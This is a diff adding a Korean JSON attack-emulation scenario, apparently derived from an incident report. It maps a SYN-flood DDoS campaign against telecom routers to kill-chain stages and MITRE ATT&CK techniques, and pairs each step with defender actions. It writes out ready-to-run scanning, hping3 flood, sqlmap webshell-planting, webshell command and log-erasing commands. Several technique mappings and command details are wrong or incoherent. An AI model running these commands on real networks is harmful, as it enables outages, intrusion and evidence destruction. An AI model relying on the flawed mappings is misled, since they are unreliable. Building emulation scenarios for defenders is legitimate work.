@@ -1,0 +1,293 @@
+[
+  {
+    "S_ID": 1,
+    "Kill_Chain": "Reconnaissance",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1595.002",
+        "reason": "공격자가 DDoS 공격을 수행하기 전에, 대상 네트워크의 외부 노출 자산(라우터, PFSense VM)에 대한 정보를 수집합니다. '해외 및 국내 타 통신사와 연동구간의 주요 네트워크 장비'를 대상으로 한다는 보고서 내용에 근거해 외부 노출 자산 정찰로 매핑합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "Network Router, PFSense VM",
+    "Title": "외부 노출 네트워크 장비 및 방화벽 스캐닝",
+    "Description": {
+      "preconditions": "공격자는 외부 네트워크(192.168.73.x)에 위치합니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "공격자는 PFSense VM의 외부 IP와 Network Router에 대해 포트 스캐닝 및 서비스 식별을 수행합니다. 이를 통해 DDoS 공격의 목표가 될 수 있는 취약한 서비스나 개방된 포트를 탐색합니다.",
+      "commands": [
+        "nmap -sS -p 1-65535 -T4 {{PFSENSE_EXTERNAL_IP}}",
+        "nmap -sV -p 80,443 {{PFSENSE_EXTERNAL_IP}}",
+        "nmap -sS -p 1-65535 -T4 {{ROUTER_EXTERNAL_IP}}",
+        "nmap -sV -p 80,443,1723 {{ROUTER_EXTERNAL_IP}}"
+      ],
+      "protocol_ports": "TCP/80, 443, 1723 (VPN), ICMP",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "네트워크 관리자는 방화벽(PFSense VM) 및 라우터 로그에서 비정상적인 포트 스캔 활동을 탐지하고, 공격 IP를 차단해야 합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에는 DDoS 공격의 대상만 명시되어 있고, 공격 전 정찰 행위는 직접적으로 언급되지 않았지만, 공격의 효율성을 높이기 위해 선행되었을 것으로 합리적으로 추론합니다."
+    }
+  },
+  {
+    "S_ID": 2,
+    "Kill_Chain": "Weaponization",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1587.001",
+        "reason": "공격에 사용될 DDoS 도구인 Syn Flooding 툴을 준비하고, 이를 자동화된 공격 스크립트로 패키징합니다."
+      },
+      {
+        "id": "T1588.001",
+        "reason": "공격에 필요한 Syn Flooding 공격 도구를 획득하거나 개발합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "Network Router",
+    "Title": "DDoS 공격 도구 준비 및 스크립트화",
+    "Description": {
+      "preconditions": "공격자는 정찰 단계에서 수집한 정보를 기반으로 공격 대상 라우터의 IP 주소를 확보했습니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "Syn Flooding 공격을 위한 맞춤형 스크립트를 작성합니다. 이 스크립트는 '대량의 syn 패킷 전송, ack 응답에는 응답하지 않아 cpu 이용률 대폭 상승'이라는 보고서 내용에 맞춰 설계됩니다. 스크립트는 대상 라우터의 IP 주소와 포트를 포함하며, 공격의 지속 시간과 패킷 전송 속도를 제어하는 로직을 포함합니다.",
+      "commands": [
+        "hping3 -c 1000000 -d 120 -S -p 80 --flood {{ROUTER_EXTERNAL_IP}}",
+        "python ddos_syn_flood.py -t {{ROUTER_EXTERNAL_IP}} -p 80 --packets 100000 --duration 63m"
+      ],
+      "protocol_ports": "TCP/80",
+      "artifacts": "ddos_syn_flood.py"
+    },
+    "Expected_Actions": "공격 도구의 패키징 단계이므로 네트워크 상에서 탐지되는 직접적인 행위는 없습니다. 하지만, 공격 준비 단계의 정보를 기반으로 잠재적 위협을 예측해야 합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에서 'Syn Flooding 기법을 활용하여 공격'이라고 명시하였지만, 공격 도구의 준비 과정은 추론합니다."
+    }
+  },
+  {
+    "S_ID": 3,
+    "Kill_Chain": "Delivery",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1071.001",
+        "reason": "Syn Flooding 공격에 사용되는 TCP 프로토콜을 통해 악성 패킷이 네트워크를 통해 전달됩니다."
+      }
+    ],
+    "Delivery_Method": "Web Exploit",
+    "Target": "Network Router",
+    "Title": "라우터 대상 Syn Flooding 패킷 전송",
+    "Description": {
+      "preconditions": "공격자는 준비된 Syn Flooding 공격 스크립트를 보유하고 있습니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "공격자는 192.168.73.x 외부 네트워크에서 VPN Access Point와 연결된 Network Router에 대해 Syn Flooding 공격을 시작합니다. '대량의 syn 패킷 전송'을 통해 대상 라우터의 TCP 연결 테이블을 고갈시켜 과부하를 유발합니다.",
+      "commands": [
+        "hping3 -c 10000000 -d 120 -S -p 80 --flood {{ROUTER_EXTERNAL_IP}}"
+      ],
+      "protocol_ports": "TCP/80",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "네트워크 장비에서 급증하는 SYN 패킷을 탐지하고, DDoS 방어 시스템을 통해 해당 트래픽을 필터링하거나 차단해야 합니다.",
+    "evidence": {
+      "type": "partial_observed",
+      "reason": "보고서에 '외부에 노출된 라우터에 Syn Flooding 기법을 활용하여 공격'이라고 명시되어 있으며, 이는 Delivery 단계의 핵심 행위입니다."
+    }
+  },
+  {
+    "S_ID": 4,
+    "Kill_Chain": "Exploitation",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1498.001",
+        "reason": "DDoS 공격으로 인해 네트워크 대역폭이 소모되고 서비스가 방해받습니다. 이는 '서비스 장애 발생'이라는 보고서 내용과 일치합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "Network Router",
+    "Title": "라우터 과부하 및 서비스 장애 발생",
+    "Description": {
+      "preconditions": "라우터가 대량의 SYN 패킷을 수신하고 있는 상태입니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "Syn Flooding 공격으로 인해 Network Router의 CPU 및 메모리 자원이 고갈되고, 정상적인 TCP 연결 처리가 불가능해집니다. 이로 인해 'G/W 3대, 라우터 11대'를 대상으로 한 DDoS 공격으로 인해 시스템 부하가 상승하며, '서비스 장애 발생'을 유발합니다.",
+      "commands": [],
+      "protocol_ports": "N/A",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "네트워크 운영팀은 라우터의 CPU 및 메모리 사용률 급증을 모니터링하고, 트래픽 유입 경로를 추적하여 공격을 차단해야 합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 'Syn Flooding 기법을 활용하여 공격 대상 라우터의 과부화 유발' 및 '서비스 장애 발생'이라고 명확하게 언급되었습니다."
+    }
+  },
+  {
+    "S_ID": 5,
+    "Kill_Chain": "Installation",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1562.004",
+        "reason": "공격자는 라우터의 과부하로 인해 보안 시스템의 탐지 및 대응 능력이 저하된 틈을 타, 추가적인 악성 활동을 위한 발판을 마련합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "N/A",
+    "Title": "보안 우회 및 추가 공격 준비",
+    "Description": {
+      "preconditions": "Network Router가 DDoS 공격으로 인해 과부하 상태에 있습니다. 이로 인해 방화벽 로그 및 보안 시스템의 경고가 무시되거나 지연될 수 있습니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "공격자는 DDoS 공격이 유발한 혼란을 틈타, 내부망 진입을 위한 다른 공격 경로를 탐색합니다. 이 단계에서는 직접적인 파일 설치보다는, 향후 내부망 침투를 위한 사전 작업(예: 취약점 스캔 재시도)이 이루어집니다.",
+      "commands": [],
+      "protocol_ports": "N/A",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "보안팀은 DDoS 공격 발생 시 다른 시스템의 로그와 경고를 면밀히 검토하여 추가적인 침투 시도가 있는지 확인해야 합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에는 DDoS 공격 이후의 직접적인 내부망 침투 행위가 명시되어 있지 않지만, '내부가입자망' 공격으로 이어지기 위해 DDoS를 방어 체계 우회 수단으로 활용했을 가능성을 추론합니다."
+    }
+  },
+  {
+    "S_ID": 6,
+    "Kill_Chain": "Installation",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1190",
+        "reason": "DDoS 공격으로 방어 체계가 혼란한 틈을 타, 웹 서비스의 취약점을 악용하여 악성 코드를 설치하는 단계입니다. '취약한 Web-Log(블로그) 플랫폼'과 '취약한 호텔 예약 시스템'에 대한 공격을 추론합니다."
+      },
+      {
+        "id": "T1505.003",
+        "reason": "웹 취약점을 통해 웹 서버에 지속성을 확보하기 위한 웹쉘을 설치합니다."
+      }
+    ],
+    "Delivery_Method": "Web Exploit",
+    "Target": "server 1(192.168.70.1), server 2(192.168.70.2), server 3(192.168.71.1)",
+    "Title": "웹 취약점(SQL Injection, LFI)을 이용한 웹쉘 설치",
+    "Description": {
+      "preconditions": "DDoS 공격으로 인한 방어 체계 혼란 상태입니다. PFSense VM이 내부 네트워크와 외부 네트워크를 분리하고 있지만, 특정 포트(예: 80, 443)는 개방되어 있습니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "공격자는 WordPress(server 1, 2)와 Joomia(server 3)의 알려진 취약점을 이용해 SQL Injection 또는 LFI(Local File Inclusion) 공격을 수행합니다. 이를 통해 웹 서버에 웹쉘(WebShell) 파일을 업로드하고, 향후 공격을 위한 지속성을 확보합니다.",
+      "commands": [
+        "sqlmap -u \"http://192.168.70.1/wp/?p=1\" --dbs --batch",
+        "sqlmap -u \"http://192.168.70.1/wp-content/plugins/vulnerable_plugin.php?file=../etc/passwd%00.jpg\" --file-write /tmp/shell.php --file-dest /var/www/html/shell.php"
+      ],
+      "protocol_ports": "HTTP/80",
+      "artifacts": "/var/www/html/shell.php (웹쉘)"
+    },
+    "Expected_Actions": "웹 서버 로그에서 비정상적인 SQL 구문 삽입 시도나, 비정상적인 파일 업로드 흔적을 탐지해야 합니다. 웹 서버의 파일 무결성 모니터링(FIM)을 통해 웹쉘 파일이 생성되었는지 확인합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "DDoS 공격 이후 '내부가입자망'에 대한 공격이 이루어졌으므로, 외부에서 접근 가능한 웹 서버를 통해 내부망 진입을 시도했을 것으로 추론합니다."
+    }
+  },
+  {
+    "S_ID": 7,
+    "Kill_Chain": "Command and Control",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1090.002",
+        "reason": "설치된 웹쉘을 통해 웹 서버와 공격자 간의 통신 채널을 구축합니다."
+      }
+    ],
+    "Delivery_Method": "Web Exploit",
+    "Target": "server 1(192.168.70.1), server 2(192.168.70.2), server 3(192.168.71.1)",
+    "Title": "웹쉘을 이용한 C2 채널 구축",
+    "Description": {
+      "preconditions": "server 1, 2, 3 중 하나에 웹쉘이 성공적으로 설치되었습니다.",
+      "vantage_point": "Attacker Host",
+      "technique": "공격자는 설치된 웹쉘에 HTTP 요청을 보내 명령을 실행하고 그 결과를 HTTP 응답으로 받습니다. 이를 통해 웹 서버의 파일 시스템을 탐색하고, 시스템 정보를 수집하며, 추가적인 악성 코드를 다운로드하거나 실행할 수 있습니다.",
+      "commands": [
+        "curl http://192.168.70.1/shell.php -d \"cmd=whoami\"",
+        "curl http://192.168.70.1/shell.php -d \"cmd=ls -al /var/www/html\""
+      ],
+      "protocol_ports": "HTTP/80",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "웹 서버의 HTTP 요청에서 비정상적인 'User-Agent'나 명령어를 포함한 POST 요청을 탐지해야 합니다. 웹 서버에 대한 비정상적인 외부 통신을 모니터링해야 합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "웹쉘 설치 후 C2 채널을 구축하는 것은 일반적인 공격 흐름입니다. 보고서의 '내부가입자망' 공격에 앞서 필요한 단계로 추론합니다."
+    }
+  },
+  {
+    "S_ID": 8,
+    "Kill_Chain": "Actions on Objectives",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1498.001",
+        "reason": "두 번째 DDoS 공격 단계로, '내부가입자망'에서 '엣지(Edge) 라우터'에 대한 DDoS 공격은 '서비스 장애 발생'을 목표로 합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "Network Router",
+    "Title": "내부망 라우터 대상 DDoS 공격 수행",
+    "Description": {
+      "preconditions": "공격자는 웹쉘을 통해 내부 네트워크(192.168.70.x)의 시스템에 접근하여 공격에 필요한 정보를 수집했습니다.",
+      "vantage_point": "server 1(192.168.70.1)",
+      "technique": "공격자는 웹쉘을 이용해 내부 서버(server 1, 2, 3 중 하나)를 DDoS 공격의 발판(Jump Host)으로 사용합니다. 내부망에 위치한 server 1에서 '내부가입자망'의 '엣지(Edge) 라우터'에 대해 'Syn Flooding' 공격을 수행합니다. 이는 '2월 4일 2회 총 57분 동안 내부가입자망에서... 공격'이라는 보고서 내용에 해당합니다.",
+      "commands": [
+        "hping3 -c 5000000 -d 120 -S -p 80 --flood {{EDGE_ROUTER_IP}}",
+        "nohup python ddos_syn_flood.py -t {{EDGE_ROUTER_IP}} -p 80 --packets 50000 --duration 57m &"
+      ],
+      "protocol_ports": "TCP/80",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "내부 네트워크의 트래픽을 모니터링하여 비정상적인 SYN Flooding 트래픽 발생 여부를 탐지해야 합니다. 내부 서버에서 외부로 향하는 대량의 악성 트래픽을 차단해야 합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '2월 4일 2회 총 57분 동안 내부가입자망에서 일부 지역 엣지(Edge) 라우터 약 320대를 대상으로 공격'이라고 명확하게 언급되었습니다."
+    }
+  },
+  {
+    "S_ID": 9,
+    "Kill_Chain": "Actions on Objectives",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1498.001",
+        "reason": "두 번째 DDoS 공격으로 인해 내부 네트워크의 라우터가 과부하되어 '서비스 장애 발생'을 유발합니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "Network Router",
+    "Title": "내부 라우터 과부하 및 서비스 장애 발생",
+    "Description": {
+      "preconditions": "내부 서버(server 1)에서 내부망 라우터에 대한 DDoS 공격이 진행 중입니다.",
+      "vantage_point": "server 1(192.168.70.1)",
+      "technique": "공격으로 인해 '엣지(Edge) 라우터'의 CPU 및 메모리 자원이 고갈되어 네트워크 지연 및 서비스 중단이 발생합니다. 이는 내부 네트워크 사용자들에게 '서비스 장애'를 일으킵니다.",
+      "commands": [],
+      "protocol_ports": "N/A",
+      "artifacts": "N/A"
+    },
+    "Expected_Actions": "내부 네트워크 라우터의 성능 지표(CPU, 메모리)를 지속적으로 모니터링하고, 비정상적인 트래픽 패턴을 탐지하여 공격의 근원지를 파악해야 합니다.",
+    "evidence": {
+      "type": "observed",
+      "reason": "보고서에 '2회 총 57분 동안... 공격' 및 '서비스 장애 발생'이라고 명확하게 언급되었습니다."
+    }
+  },
+  {
+    "S_ID": 10,
+    "Kill_Chain": "Actions on Objectives",
+    "MITRE_ATT&CK": [
+      {
+        "id": "T1041",
+        "reason": "공격 후 악성 활동의 흔적을 지우는 행위입니다. 이는 DDoS 공격 이후 탐지를 어렵게 하기 위해 수행됩니다."
+      }
+    ],
+    "Delivery_Method": "N/A",
+    "Target": "server 1(192.168.70.1)",
+    "Title": "공격 흔적 및 로그 은폐",
+    "Description": {
+      "preconditions": "DDoS 공격이 완료되었습니다. 공격자는 웹쉘을 통해 여전히 내부 서버에 접근할 수 있습니다.",
+      "vantage_point": "server 1(192.168.70.1)",
+      "technique": "공격자는 웹쉘을 이용해 DDoS 공격에 사용된 스크립트 파일을 삭제하거나, 웹 서버의 접근 로그 및 시스템 로그에서 자신의 흔적을 지웁니다. 'tail -n 100 /var/log/apache2/access.log > /tmp/temp_log.txt && mv /tmp/temp_log.txt /var/log/apache2/access.log'와 같이 비정상적인 로그를 제거합니다.",
+      "commands": [
+        "rm /var/www/html/shell.php",
+        "rm /tmp/ddos_syn_flood.py",
+        "sed -i '/{{ATTACKER_IP}}/d' /var/log/apache2/access.log"
+      ],
+      "protocol_ports": "N/A",
+      "artifacts": "/var/log/apache2/access.log (로그 파일 변조)"
+    },
+    "Expected_Actions": "로그 관리 시스템(SIEM)을 통해 로그의 무결성이 손상되었는지 확인해야 합니다. 시스템의 비정상적인 파일 삭제 또는 수정 이력을 모니터링해야 합니다.",
+    "evidence": {
+      "type": "inferred",
+      "reason": "보고서에는 흔적 은폐가 직접적으로 언급되지 않았지만, 공격의 은폐 및 지속성 확보를 위해 필수적인 단계로 추론합니다."
+    }
+  }
+]
